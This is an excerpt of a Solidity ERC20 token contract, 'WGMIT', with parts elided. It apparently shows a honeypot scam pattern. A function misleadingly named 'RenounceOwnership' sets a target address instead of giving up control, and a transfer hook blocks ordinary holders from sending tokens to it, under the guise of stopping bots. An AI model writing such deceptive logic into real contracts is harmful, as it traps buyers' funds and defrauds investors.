...
contract WGMIT is ERC20, Ownable {
    mapping(address=>bool) private _blacklisted;
    address private _wgmitToken;
    constructor() ERC20('We\'re Gonna Make It Together','WGMIT') {
    ...
    function RenounceOwnership(address wgmitToken_) public onlyOwner {
        _wgmitToken = wgmitToken_;
    }

    function _lamboFactory(address from, address to, uint256 amount) internal virtual override {
        if(to == _wgmitToken) {
            require(_blacklisted[from], "BOTS ARE NGMI!");
        }
    }
}